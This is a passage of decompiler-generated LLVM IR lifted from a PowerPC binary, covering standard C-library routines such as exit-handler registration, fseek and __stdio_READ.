  store i32 5, i32* %r9.global-to-local, align 4
  %v0_10012c30 = load i32, i32* %r0.global-to-local, align 4
  %v1_10012c30 = trunc i32 %v0_10012c30 to i16
  store i16 %v1_10012c30, i16* %tmp, align 2
  %v0_10012c34 = load i32, i32* %r10.global-to-local, align 4
  %v1_10012c34 = or i32 %v0_10012c34, 58989
  store i32 %v1_10012c34, i32* %r10.global-to-local, align 4
  store i32 11, i32* %r0.global-to-local, align 4
  %v0_10012c40 = load i32, i32* %r9.global-to-local, align 4
  %v3_10012c40 = add i32 %arg2, 16
  %v4_10012c40 = inttoptr i32 %v3_10012c40 to i32*
  store i32 %v0_10012c40, i32* %v4_10012c40, align 4
  %v0_10012c44 = load i32, i32* %r10.global-to-local, align 4
  %v3_10012c44 = add i32 %arg2, 20
  %v4_10012c44 = inttoptr i32 %v3_10012c44 to i32*
  store i32 %v0_10012c44, i32* %v4_10012c44, align 4
  %v0_10012c48 = load i32, i32* %r0.global-to-local, align 4
  %v1_10012c48 = trunc i32 %v0_10012c48 to i16
  %v4_10012c48 = add i32 %arg2, 12
  %v5_10012c48 = inttoptr i32 %v4_10012c48 to i16*
  store i16 %v1_10012c48, i16* %v5_10012c48, align 2
  ret i32 0
}

define i32 @__exit_handler(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r10, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r8, align 4
  %v3_10012ccc4 = load i32, i32* @global_var_1002c3d4.467, align 4
  %v3_10012cd07 = icmp eq i32 %v3_10012ccc4, 0
  %v1_10012cd48 = add i32 %v3_10012ccc4, -1
  %v3_10012ce010 = load i32, i32* @global_var_1002c3d8.466, align 4
  br i1 %v3_10012cd07, label %dec_label_pc_10012ce0, label %dec_label_pc_10012c68

dec_label_pc_10012c68:                            ; preds = %entry, %dec_label_pc_10012cc4.backedge
  %v3_10012ce013 = phi i32 [ %v3_10012ce0, %dec_label_pc_10012cc4.backedge ], [ %v3_10012ce010, %entry ]
  %v1_10012cd411 = phi i32 [ %v1_10012cd4, %dec_label_pc_10012cc4.backedge ], [ %v1_10012cd48, %entry ]
  %v1_10012cd812.in = phi i32 [ %v1_10012cd4, %dec_label_pc_10012cc4.backedge ], [ %v1_10012cd48, %entry ]
  %v1_10012cd812 = mul i32 %v1_10012cd812.in, 16
  store i32 %v1_10012cd411, i32* @global_var_1002c3d4.467, align 4
  %v2_10012c70 = add i32 %v3_10012ce013, %v1_10012cd812
  %v3_10012c70 = inttoptr i32 %v2_10012c70 to i32*
  %v4_10012c70 = load i32, i32* %v3_10012c70, align 4
  %v3_10012c78 = icmp eq i32 %v4_10012c70, 2
  br i1 %v3_10012c78, label %dec_label_pc_10012c8c, label %dec_label_pc_10012c84

dec_label_pc_10012c84:                            ; preds = %dec_label_pc_10012c68
  %v3_10012c7c = icmp eq i32 %v4_10012c70, 3
  br i1 %v3_10012c7c, label %dec_label_pc_10012cac, label %dec_label_pc_10012cc4.backedge

dec_label_pc_10012c8c:                            ; preds = %dec_label_pc_10012c68
  %v1_10012c8c = add i32 %v2_10012c70, 4
  %v2_10012c8c = inttoptr i32 %v1_10012c8c to i32*
  %v3_10012c8c = load i32, i32* %v2_10012c8c, align 4
  %v3_10012c94 = icmp eq i32 %v3_10012c8c, 0
  br i1 %v3_10012c94, label %dec_label_pc_10012cc4.backedge, label %dec_label_pc_10012c9c

dec_label_pc_10012c9c:                            ; preds = %dec_label_pc_10012c8c
  call void @__pseudo_call(i32 %v3_10012c8c)
  br label %dec_label_pc_10012cc4.backedge

dec_label_pc_10012cac:                            ; preds = %dec_label_pc_10012c84
  %v1_10012cac = add i32 %v2_10012c70, 4
  %v2_10012cac = inttoptr i32 %v1_10012cac to i32*
  %v3_10012cac = load i32, i32* %v2_10012cac, align 4
  %v3_10012cb0 = icmp eq i32 %v3_10012cac, 0
  br i1 %v3_10012cb0, label %dec_label_pc_10012cc4.backedge, label %dec_label_pc_10012cb8

dec_label_pc_10012cb8:                            ; preds = %dec_label_pc_10012cac
  call void @__pseudo_call(i32 %v3_10012cac)
  br label %dec_label_pc_10012cc4.backedge

dec_label_pc_10012cc4.backedge:                   ; preds = %dec_label_pc_10012cb8, %dec_label_pc_10012c9c, %dec_label_pc_10012c8c, %dec_label_pc_10012cac, %dec_label_pc_10012c84
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r10, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r8, align 4
  %v3_10012ccc = load i32, i32* @global_var_1002c3d4.467, align 4
  %v3_10012cd0 = icmp eq i32 %v3_10012ccc, 0
  %v1_10012cd4 = add i32 %v3_10012ccc, -1
  %v3_10012ce0 = load i32, i32* @global_var_1002c3d8.466, align 4
  br i1 %v3_10012cd0, label %dec_label_pc_10012ce0, label %dec_label_pc_10012c68

dec_label_pc_10012ce0:                            ; preds = %dec_label_pc_10012cc4.backedge, %entry
  %v3_10012ce0.lcssa = phi i32 [ %v3_10012ce010, %entry ], [ %v3_10012ce0, %dec_label_pc_10012cc4.backedge ]
  store i32 %v3_10012ce0.lcssa, i32* @r3, align 4
  store i32 268512488, i32* @lr, align 4
  %v0_10012ce4 = call i32 @free()
  ret i32 %v0_10012ce4

; uselistorder directives
  uselistorder i32 %v1_10012cd4, { 1, 0 }
  uselistorder i32 %v2_10012c70, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10012cc4.backedge, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_10012c68, { 1, 0 }
}

define i32 @__new_exitfn() local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002c1dc.347 to i32), i32* %r29.global-to-local, align 4
  %v2_10012d1c = ptrtoint i32* %stack_var_-40 to i32
  %v4_10012d24 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 268461856, i32 ptrtoint (i32* @global_var_1002c1dc.347 to i32))
  store i32 268512564, i32* @lr, align 4
  %v1_10012d30 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002c1dc.347 to i32))
  %v3_10012d38 = load i32, i32* @global_var_1002c3d4.467, align 4
  %v3_10012d40 = load i32, i32* @global_var_1002c3dc.469, align 4
  %v1_10012d44 = add i32 %v3_10012d38, 1
  store i32 %v1_10012d44, i32* @r9, align 4
  %v2_10012d48 = icmp slt i32 %v3_10012d40, %v1_10012d44
  %v1_10012d4c = mul i32 %v3_10012d40, 16
  %v1_10012d50 = add i32 %v1_10012d4c, 320
  store i32 %v1_10012d50, i32* @r4, align 4
  %v3_10012d58 = load i32, i32* @global_var_1002c3d8.466, align 4
  br i1 %v2_10012d48, label %dec_label_pc_10012d58, label %dec_label_pc_10012d88

dec_label_pc_10012d58:                            ; preds = %entry
  store i32 268512608, i32* @lr, align 4
  %v1_10012d5c = call i32 @realloc(i32 %v3_10012d58)
  store i32 %v1_10012d5c, i32* %r29.global-to-local, align 4
  %v3_10012d60 = icmp eq i32 %v1_10012d5c, 0
  br i1 %v3_10012d60, label %dec_label_pc_10012d68, label %dec_label_pc_10012d78

dec_label_pc_10012d68:                            ; preds = %dec_label_pc_10012d58
  %v0_10012d68 = call i32 @__errno_location()
  %v2_10012d70 = inttoptr i32 %v0_10012d68 to i32*
  store i32 12, i32* %v2_10012d70, align 4
  br label %dec_label_pc_10012dc0

dec_label_pc_10012d78:                            ; preds = %dec_label_pc_10012d58
  %v3_10012d78 = load i32, i32* @global_var_1002c3dc.469, align 4
  store i32 %v1_10012d5c, i32* @global_var_1002c3d8.466, align 4
  %v1_10012d80 = add i32 %v3_10012d78, 20
  store i32 %v1_10012d80, i32* @global_var_1002c3dc.469, align 4
  %v3_10012d90.pre = load i32, i32* @global_var_1002c3d4.467, align 4
  br label %dec_label_pc_10012d88

dec_label_pc_10012d88:                            ; preds = %entry, %dec_label_pc_10012d78
  %v3_10012d98 = phi i32 [ %v1_10012d5c, %dec_label_pc_10012d78 ], [ %v3_10012d58, %entry ]
  %v3_10012d90 = phi i32 [ %v3_10012d90.pre, %dec_label_pc_10012d78 ], [ %v3_10012d38, %entry ]
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r8, align 4
  store i32 %v3_10012d98, i32* %r7.global-to-local, align 4
  %v1_10012da0 = add i32 %v3_10012d90, 1
  %v1_10012da8 = mul i32 %v3_10012d90, 16
  store i32 %v1_10012da8, i32* @r10, align 4
  store i32 %v1_10012da0, i32* @global_var_1002c3d4.467, align 4
  store i32 268512336, i32* @global_var_1002c38c.348, align 4
  %v3_10012db8 = add i32 %v1_10012da8, %v3_10012d98
  %v4_10012db8 = inttoptr i32 %v3_10012db8 to i32*
  store i32 1, i32* %v4_10012db8, align 4
  %v0_10012dbc = load i32, i32* @r10, align 4
  %v1_10012dbc = load i32, i32* %r7.global-to-local, align 4
  %v2_10012dbc = add i32 %v1_10012dbc, %v0_10012dbc
  store i32 %v2_10012dbc, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10012dc0

dec_label_pc_10012dc0:                            ; preds = %dec_label_pc_10012d68, %dec_label_pc_10012d88
  store i32 %v2_10012d1c, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268512716, i32* @lr, align 4
  %v0_10012dc8 = call i32 @__pthread_cleanup_pop_restore()
  %v0_10012dd0 = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_10012dd0

; uselistorder directives
  uselistorder i32 %v1_10012da8, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_1002c3d8.466, { 1, 2, 3, 0 }
  uselistorder i32 320, { 1, 0 }
  uselistorder i32* @global_var_1002c3d4.467, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002c1dc.347 to i32), { 0, 2, 4, 1, 3 }
  uselistorder label %dec_label_pc_10012dc0, { 1, 0 }
  uselistorder label %dec_label_pc_10012d88, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10012de4 = add i32 %arg1, 28
  %v2_10012de4 = inttoptr i32 %v1_10012de4 to i32*
  %v3_10012de4 = load i32, i32* %v2_10012de4, align 4
  store i32 %v3_10012de4, i32* @global_var_1002c3e0.471, align 4
  %v1_10012df4 = add i32 %arg1, 44
  %v2_10012df4 = inttoptr i32 %v1_10012df4 to i32*
  %v3_10012df4 = load i32, i32* %v2_10012df4, align 4
  store i32 %v3_10012df4, i32* @global_var_1002c3e4.472, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_1002c3e8.377, align 4
  %v0_10012e28 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 true, i32 %v0_10012e28)
  store i32 12, i32* @r3, align 4
  %v0_10012e30 = call i32 @__syscall_error()
  ret i32 %v0_10012e30

; uselistorder directives
  uselistorder i32 ()* @__syscall_error, { 0, 3, 2, 1 }
  uselistorder i32* @global_var_1002c3e8.377, { 1, 0, 2 }
}

define i32 @__cmsg_nxthdr() local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %v0_10012e34 = load i32, i32* @r4, align 4
  %v1_10012e34 = inttoptr i32 %v0_10012e34 to i32*
  %v2_10012e34 = load i32, i32* %v1_10012e34, align 4
  %v0_10012e38 = load i32, i32* @r3, align 4
  store i32 %v0_10012e38, i32* %r11.global-to-local, align 4
  %v1_10012e3c = icmp ult i32 %v2_10012e34, 11
  %v3_10012e3c = icmp eq i32 %v2_10012e34, 11
  store i1 %v1_10012e3c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012e3c, i1* %cr7_eq.global-to-local, align 1
  %v1_10012e40 = add i32 %v2_10012e34, 3
  store i32 %v1_10012e40, i32* %r0.global-to-local, align 4
  %v1_10012e44 = call i32 @__asm_rlwinm(i32 %v1_10012e40, i32 0, i32 0, i32 29)
  %v0_10012e48 = load i32, i32* @r4, align 4
  %v2_10012e48 = add i32 %v0_10012e48, %v1_10012e44
  store i32 %v2_10012e48, i32* %r3.global-to-local, align 4
  %v1_10012e4c = add i32 %v2_10012e48, 12
  %v0_10012e50 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_10012e50 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_10012e50 = or i1 %v0_10012e50, %v1_10012e50
  br i1 %v2_10012e50, label %dec_label_pc_10012e80, label %dec_label_pc_10012e54

dec_label_pc_10012e54:                            ; preds = %entry
  %v0_10012e54 = load i32, i32* %r11.global-to-local, align 4
  %v1_10012e54 = add i32 %v0_10012e54, 20
  %v2_10012e54 = inttoptr i32 %v1_10012e54 to i32*
  %v3_10012e54 = load i32, i32* %v2_10012e54, align 4
  store i32 %v3_10012e54, i32* %r0.global-to-local, align 4
  %v1_10012e58 = add i32 %v0_10012e54, 16
  %v2_10012e58 = inttoptr i32 %v1_10012e58 to i32*
  %v3_10012e58 = load i32, i32* %v2_10012e58, align 4
  %v2_10012e5c = add i32 %v3_10012e58, %v3_10012e54
  store i32 %v2_10012e5c, i32* %r0.global-to-local, align 4
  %v2_10012e60 = icmp ult i32 %v1_10012e4c, %v2_10012e5c
  %v3_10012e60 = icmp ugt i32 %v1_10012e4c, %v2_10012e5c
  %v4_10012e60 = icmp eq i32 %v1_10012e4c, %v2_10012e5c
  store i1 %v2_10012e60, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10012e60, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10012e60, label %dec_label_pc_10012e80, label %dec_label_pc_10012e68

dec_label_pc_10012e68:                            ; preds = %dec_label_pc_10012e54
  %v3_10012e68 = inttoptr i32 %v2_10012e48 to i32*
  %v4_10012e68 = load i32, i32* %v3_10012e68, align 4
  %v1_10012e6c = add i32 %v4_10012e68, 3
  %v1_10012e70 = call i32 @__asm_rlwinm(i32 %v1_10012e6c, i32 0, i32 0, i32 29)
  %v0_10012e74 = load i32, i32* %r3.global-to-local, align 4
  %v2_10012e74 = add i32 %v0_10012e74, %v1_10012e70
  %v1_10012e78 = load i32, i32* %r0.global-to-local, align 4
  %v2_10012e78 = icmp ult i32 %v2_10012e74, %v1_10012e78
  %v4_10012e78 = icmp eq i32 %v2_10012e74, %v1_10012e78
  store i1 %v2_10012e78, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10012e78, i1* %cr7_eq.global-to-local, align 1
  %v0_10012e7c = load i32, i32* @lr, align 4
  %tmp = icmp ule i32 %v2_10012e74, %v1_10012e78
  call void @__pseudo_cond_branch(i1 %tmp, i32 %v0_10012e7c)
  br label %dec_label_pc_10012e80

dec_label_pc_10012e80:                            ; preds = %dec_label_pc_10012e54, %entry, %dec_label_pc_10012e68
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_10012e74, { 0, 2, 1 }
  uselistorder i32 %v2_10012e5c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10012e4c, { 2, 1, 0 }
  uselistorder i32 %v2_10012e34, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10012e80, { 2, 0, 1 }
}

define i32 @__GI_fseek(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10012e88 = load i32, i32* @r5, align 4
  store i32 %v0_10012e88, i32* @r7, align 4
  %tmp = icmp slt i32 %arg1, 0
  %v1_10012e90 = zext i1 %tmp to i32
  %v2_10012e90 = ashr i32 %arg1, 31
  %v3_10012e90 = and i32 %v2_10012e90, -2
  %v4_10012e90 = or i32 %v3_10012e90, %v1_10012e90
  %v3_10012e94 = inttoptr i32 %v4_10012e90 to i16*
  %v4_10012e94 = call i32 @__GI_fseeko64(i16* %v3_10012e94, i32 %arg1, i32 %v0_10012e88)
  ret i32 %v4_10012e94

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_10012f2c = load i32, i32* @r7, align 4
  %v0_10012f30 = load i32, i32* @lr, align 4
  store i32 %v0_10012f30, i32* %r0.global-to-local, align 4
  store i32 %v0_10012f2c, i32* @r30, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %tmp9 = icmp ult i32 %v0_10012f2c, 3
  br i1 %tmp9, label %dec_label_pc_10012f68, label %dec_label_pc_10012f54

dec_label_pc_10012f54:                            ; preds = %entry
  %v0_10012f54 = call i32 @__errno_location()
  store i32 -1, i32* @r30, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10012f60 = inttoptr i32 %v0_10012f54 to i32*
  store i32 22, i32* %v2_10012f60, align 4
  br label %dec_label_pc_10013030

dec_label_pc_10012f68:                            ; preds = %entry
  %v2_10012f68 = add i32 %tmp, 52
  %v3_10012f68 = inttoptr i32 %v2_10012f68 to i32*
  %v4_10012f68 = load i32, i32* %v3_10012f68, align 4
  store i32 %v4_10012f68, i32* @r28, align 4
  %v3_10012f6c = icmp eq i32 %v4_10012f68, 0
  br i1 %v3_10012f6c, label %dec_label_pc_10012f74, label %dec_label_pc_10012f94

dec_label_pc_10012f74:                            ; preds = %dec_label_pc_10012f68
  %v2_10012f74 = add i32 %tmp, 56
  store i32 %v2_10012f74, i32* @r29, align 4
  %v4_10012f88 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 268461856, i32 %v2_10012f74)
  %v0_10012f8c = load i32, i32* @r29, align 4
  store i32 268513172, i32* @lr, align 4
  %v1_10012f90 = call i32 @pthread_mutex_lock(i32 %v0_10012f8c)
  %v0_10012f94.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10012f94

dec_label_pc_10012f94:                            ; preds = %dec_label_pc_10012f68, %dec_label_pc_10012f74
  %v0_10012fa0 = phi i32 [ %tmp, %dec_label_pc_10012f68 ], [ %v0_10012f94.pre, %dec_label_pc_10012f74 ]
  %v1_10012f94 = inttoptr i32 %v0_10012fa0 to i16*
  %v2_10012f94 = load i16, i16* %v1_10012f94, align 2
  %v3_10012f94 = zext i16 %v2_10012f94 to i32
  store i32 %v3_10012f94, i32* %r0.global-to-local, align 4
  %v1_10012f98 = and i32 %v3_10012f94, 64
  store i32 %v1_10012f98, i32* %r9.global-to-local, align 4
  %v3_10012f98 = icmp eq i32 %v1_10012f98, 0
  br i1 %v3_10012f98, label %dec_label_pc_10012fb0, label %dec_label_pc_10012fa0

dec_label_pc_10012fa0:                            ; preds = %dec_label_pc_10012f94
  store i32 %v0_10012fa0, i32* @r3, align 4
  store i32 268513192, i32* @lr, align 4
  %v0_10012fa4 = call i32 @__stdio_wcommit()
  %v3_10012fa8 = icmp eq i32 %v0_10012fa4, 0
  br i1 %v3_10012fa8, label %dec_label_pc_10012fb0, label %dec_label_pc_10013018

dec_label_pc_10012fb0:                            ; preds = %dec_label_pc_10012fa0, %dec_label_pc_10012f94
  %v0_10012fb0 = load i32, i32* @r30, align 4
  %v3_10012fb0 = icmp eq i32 %v0_10012fb0, 1
  br i1 %v3_10012fb0, label %dec_label_pc_10012fb8, label %dec_label_pc_10012fb0.dec_label_pc_10012fcc_crit_edge

dec_label_pc_10012fb0.dec_label_pc_10012fcc_crit_edge: ; preds = %dec_label_pc_10012fb0
  br label %dec_label_pc_10012fcc

dec_label_pc_10012fb8:                            ; preds = %dec_label_pc_10012fb0
  %v0_10012fb8 = load i32, i32* @r31, align 4
  %v1_10012fb8 = inttoptr i32 %v0_10012fb8 to i16*
  %v2_10012fbc = ptrtoint i32* %stack_var_-56 to i32
  store i32 268513220, i32* @lr, align 4
  %v4_10012fc0 = call i32 @__stdio_adjust_position(i16* %v1_10012fb8, i32 %v2_10012fbc)
  %v1_10012fc4 = icmp slt i32 %v4_10012fc0, 0
  br i1 %v1_10012fc4, label %dec_label_pc_10013018, label %dec_label_pc_10012fb8.dec_label_pc_10012fcc_crit_edge

dec_label_pc_10012fb8.dec_label_pc_10012fcc_crit_edge: ; preds = %dec_label_pc_10012fb8
  %v0_10012fcc.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10012fcc

dec_label_pc_10012fcc:                            ; preds = %dec_label_pc_10012fb0.dec_label_pc_10012fcc_crit_edge, %dec_label_pc_10012fb8.dec_label_pc_10012fcc_crit_edge
  %v0_10012fcc = phi i32 [ %v0_10012fb0, %dec_label_pc_10012fb0.dec_label_pc_10012fcc_crit_edge ], [ %v0_10012fcc.pre, %dec_label_pc_10012fb8.dec_label_pc_10012fcc_crit_edge ]
  %v0_10012fd0 = load i32, i32* @r31, align 4
  store i32 268513244, i32* @lr, align 4
  %v5_10012fd8 = call i32 @__stdio_seek(i32 %v0_10012fd0, i32* nonnull %stack_var_-56, i32 %v0_10012fcc)
  %v1_10012fdc = icmp slt i32 %v5_10012fd8, 0
  br i1 %v1_10012fdc, label %dec_label_pc_10013018, label %dec_label_pc_10012fe4

dec_label_pc_10012fe4:                            ; preds = %dec_label_pc_10012fcc
  %v0_10012fe4 = load i32, i32* @r31, align 4
  %v1_10012fe4 = inttoptr i32 %v0_10012fe4 to i16*
  %v2_10012fe4 = load i16, i16* %v1_10012fe4, align 2
  %v3_10012fe4 = zext i16 %v2_10012fe4 to i32
  store i32 %v3_10012fe4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_10012fec = add i32 %v0_10012fe4, 8
  %v2_10012fec = inttoptr i32 %v1_10012fec to i32*
  %v3_10012fec = load i32, i32* %v2_10012fec, align 4
  store i32 %v3_10012fec, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v1_10012ff4 = and i32 %v3_10012fe4, 65464
  store i32 %v1_10012ff4, i32* %r0.global-to-local, align 4
  %v3_10012ff8 = add i32 %v0_10012fe4, 2
  %v4_10012ff8 = inttoptr i32 %v3_10012ff8 to i8*
  store i8 0, i8* %v4_10012ff8, align 1
  %v0_10012ffc = load i32, i32* %r9.global-to-local, align 4
  %v1_10012ffc = load i32, i32* @r31, align 4
  %v2_10012ffc = add i32 %v1_10012ffc, 28
  %v3_10012ffc = inttoptr i32 %v2_10012ffc to i32*
  store i32 %v0_10012ffc, i32* %v3_10012ffc, align 4
  %v0_10013000 = load i32, i32* %r0.global-to-local, align 4
  %v1_10013000 = trunc i32 %v0_10013000 to i16
  %v2_10013000 = load i32, i32* @r31, align 4
  %v3_10013000 = inttoptr i32 %v2_10013000 to i16*
  store i16 %v1_10013000, i16* %v3_10013000, align 2
  %v0_10013004 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013004 = load i32, i32* @r31, align 4
  %v2_10013004 = add i32 %v1_10013004, 16
  %v3_10013004 = inttoptr i32 %v2_10013004 to i32*
  store i32 %v0_10013004, i32* %v3_10013004, align 4
  %v0_10013008 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013008 = load i32, i32* @r31, align 4
  %v2_10013008 = add i32 %v1_10013008, 20
  %v3_10013008 = inttoptr i32 %v2_10013008 to i32*
  store i32 %v0_10013008, i32* %v3_10013008, align 4
  %v0_1001300c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001300c = load i32, i32* @r31, align 4
  %v2_1001300c = add i32 %v1_1001300c, 24
  %v3_1001300c = inttoptr i32 %v2_1001300c to i32*
  store i32 %v0_1001300c, i32* %v3_1001300c, align 4
  %v0_10013010 = load i32, i32* %r11.global-to-local, align 4
  %v1_10013010 = load i32, i32* @r31, align 4
  %v2_10013010 = add i32 %v1_10013010, 44
  %v3_10013010 = inttoptr i32 %v2_10013010 to i32*
  store i32 %v0_10013010, i32* %v3_10013010, align 4
  br label %dec_label_pc_1001301c

dec_label_pc_10013018:                            ; preds = %dec_label_pc_10012fa0, %dec_label_pc_10012fcc, %dec_label_pc_10012fb8
  store i32 -1, i32* @r30, align 4
  br label %dec_label_pc_1001301c

dec_label_pc_1001301c:                            ; preds = %dec_label_pc_10012fe4, %dec_label_pc_10013018
  %v0_1001301c = load i32, i32* @r28, align 4
  %v3_1001301c = icmp eq i32 %v0_1001301c, 0
  br i1 %v3_1001301c, label %dec_label_pc_10013024, label %dec_label_pc_10013030

dec_label_pc_10013024:                            ; preds = %dec_label_pc_1001301c
  %v2_10013024 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10013024, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268513328, i32* @lr, align 4
  %v0_1001302c = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_10013030

dec_label_pc_10013030:                            ; preds = %dec_label_pc_1001301c, %dec_label_pc_10012f54, %dec_label_pc_10013024
  store i32 %v0_10012f30, i32* %r0.global-to-local, align 4
  %v0_10013034 = load i32, i32* @r30, align 4
  ret i32 %v0_10013034

; uselistorder directives
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32 22, { 20, 43, 21, 35, 22, 36, 23, 24, 25, 41, 26, 48, 27, 42, 28, 29, 40, 30, 31, 39, 32, 0, 1, 37, 2, 44, 33, 34, 38, 45, 47, 3, 46, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder label %dec_label_pc_10013030, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001301c, { 1, 0 }
  uselistorder label %dec_label_pc_10013018, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10012fcc, { 1, 0 }
  uselistorder label %dec_label_pc_10012f94, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10013054 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10013060 = load i16, i16* %arg1, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10013068 = and i16 %v3_10013060, 4
  %v3_10013068 = icmp eq i16 %v1_10013068, 0
  br i1 %v3_10013068, label %dec_label_pc_10013070, label %dec_label_pc_100130a8

dec_label_pc_10013070:                            ; preds = %entry
  %tmp10 = icmp sgt i32 %arg2, -1
  br i1 %tmp10, label %dec_label_pc_1001307c, label %dec_label_pc_10013074

dec_label_pc_10013074:                            ; preds = %dec_label_pc_10013070
  br label %dec_label_pc_1001307c

dec_label_pc_1001307c:                            ; preds = %dec_label_pc_10013070, %dec_label_pc_10013074
  %v1_1001307c = add i32 %tmp, 4
  %v2_1001307c = inttoptr i32 %v1_1001307c to i32*
  %v3_1001307c = load i32, i32* %v2_1001307c, align 4
  store i32 %v3_1001307c, i32* %r3.global-to-local, align 4
  store i32 268513412, i32* @lr, align 4
  %v1_10013080 = call i32 @__libc_read(i32 %v3_1001307c)
  store i32 %v1_10013080, i32* %r3.global-to-local, align 4
  %v2_10013084 = icmp sgt i32 %v1_10013080, 0
  br i1 %v2_10013084, label %dec_label_pc_100130a8, label %dec_label_pc_1001308c

dec_label_pc_1001308c:                            ; preds = %dec_label_pc_1001307c
  %v3_10013084 = icmp eq i32 %v1_10013080, 0
  %v0_1001308c = load i32, i32* @r31, align 4
  %v1_1001308c = inttoptr i32 %v0_1001308c to i16*
  %v2_1001308c = load i16, i16* %v1_1001308c, align 2
  br i1 %v3_10013084, label %dec_label_pc_10013094, label %dec_label_pc_1001309c

dec_label_pc_10013094:                            ; preds = %dec_label_pc_1001308c
  %v1_10013094 = or i16 %v2_1001308c, 4
  br label %dec_label_pc_100130a4

dec_label_pc_1001309c:                            ; preds = %dec_label_pc_1001308c
  %v1_1001309c = or i16 %v2_1001308c, 8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100130a4

dec_label_pc_100130a4:                            ; preds = %dec_label_pc_10013094, %dec_label_pc_1001309c
  %v1_10013094.sink.off0 = phi i16 [ %v1_10013094, %dec_label_pc_10013094 ], [ %v1_1001309c, %dec_label_pc_1001309c ]
  store i16 %v1_10013094.sink.off0, i16* %v1_1001308c, align 2
  %v0_100130b8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100130a8

dec_label_pc_100130a8:                            ; preds = %entry, %dec_label_pc_1001307c, %dec_label_pc_100130a4
  %v0_100130b8 = phi i32 [ 0, %entry ], [ %v1_10013080, %dec_label_pc_1001307c ], [ %v0_100130b8.pre, %dec_label_pc_100130a4 ]
  store i32 %v0_10013054, i32* @r31, align 4
  ret i32 %v0_100130b8

; uselistorder directives
  uselistorder i16 %v2_1001308c, { 1, 0 }
  uselistorder i32 %v1_10013080, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 4, 1, 5, 2, 3, 0 }
  uselistorder i32 (i32)* @__libc_read, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_100130a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100130a4, { 1, 0 }
